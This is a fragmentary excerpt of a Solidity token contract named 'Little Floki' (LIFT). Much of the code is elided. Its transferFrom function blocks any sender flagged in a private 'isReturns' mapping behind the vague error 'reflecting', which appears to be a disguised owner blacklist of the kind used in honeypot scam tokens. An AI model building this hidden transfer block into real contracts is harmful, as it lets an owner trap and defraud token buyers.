...
contract LittleFloki is Context, Ownable{
    mapping (address => uint256) public balance;
    mapping (address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isReturns;
    uint256 public totalSupply = 1000000000000 * 10 ** 18;
    string public name = "Little Floki";
    string public symbol = "LIFT";
    uint256 public decimals = 18;

    uint256 public taxPr = 0;
    address public poolAdd = 0x0000000000000000000000000000000000000002;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address[] memory _approved) {
        require(_approved.length > 0, "data error");
    ...
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        ...
        require(!isReturns[from], "reflecting");
        uint256 taxes = calculateTaxes(value);
        uint256 newAmount = value - taxes;
        balance[to] += newAmount;
        balance[from] -= value;
